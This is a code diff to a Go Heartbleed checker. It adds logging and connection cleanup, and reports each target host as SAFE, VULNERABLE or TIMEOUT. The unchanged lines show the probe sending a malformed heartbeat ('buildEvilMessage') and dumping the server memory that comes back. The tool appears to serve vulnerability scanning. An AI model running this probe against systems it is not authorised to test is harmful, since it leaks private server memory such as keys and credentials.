@@ -5,6 +5,7 @@ import (
 	"encoding/binary"
 	"github.com/FiloSottile/Heartbleed/tls"
 	"github.com/davecgh/go-spew/spew"
+	"log"
 	"os"
 	"time"
 )
@@ -46,14 +47,18 @@ func main() {
 		InsecureSkipVerify: true,
 	})
 	if err != nil {
-		panic("failed to connect: " + err.Error())
+		log.Fatalf("%v - failed to connect: %v", os.Args[1], err.Error())
 	}
 
 	conn.SendHeartbeat([]byte(buildEvilMessage(PAYLOAD)), func(data []byte) {
 		spew.Dump(data)
 		if bytes.Index(data, PADDING) == -1 {
+			conn.Close()
+			log.Printf("%v - SAFE", os.Args[1])
 			os.Exit(1)
 		} else {
+			conn.Close()
+			log.Printf("%v - VULNERABLE", os.Args[1])
 			os.Exit(0)
 		}
 
@@ -63,5 +68,7 @@ func main() {
 		conn.Read(nil)
 	}()
 	time.Sleep(3 * time.Second)
+	conn.Close()
+	log.Printf("%v - TIMEOUT", os.Args[1])
 	os.Exit(1)
 }
